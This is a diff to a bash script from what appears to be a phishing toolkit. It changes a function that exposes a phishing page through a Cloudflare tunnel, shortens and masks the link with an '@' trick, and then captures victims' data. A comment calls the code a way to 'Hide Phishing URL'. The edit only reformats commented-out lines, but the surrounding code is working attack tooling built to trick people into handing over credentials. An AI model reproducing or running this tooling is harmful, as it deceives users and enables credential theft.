@@ -511,21 +511,20 @@ start_cloudflared() {
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
 	custom_url "$cldflr_link"
-	<< 'MULTILINE-COMMENT'
-	cldflr_link1=${cldflr_link#https://}
+
+	# cldflr_link1=${cldflr_link#https://}
 	
 	# Bash Script for Hide Phishing URL Created by KP
 	
-	short=$(curl -s https://www.is.gd/create.php\?format\=simple\&url\=${cldflr_link})
-	shorter=${short#https://}
-	final=$shorter
-	echo -e "Here is the Advanced URL:\e[32m ${final} \e[0m\n"
+	# short=$(curl -s https://www.is.gd/create.php\?format\=simple\&url\=${cldflr_link})
+	# shorter=${short#https://}
+	# final=$shorter
+	# echo -e "Here is the Advanced URL:\e[32m ${final} \e[0m\n"
 	
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${GREEN}$mask@$final"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${GREEN}$mask@$final"
 	
-	MULTILINE-COMMENT
 	capture_data
 }
 
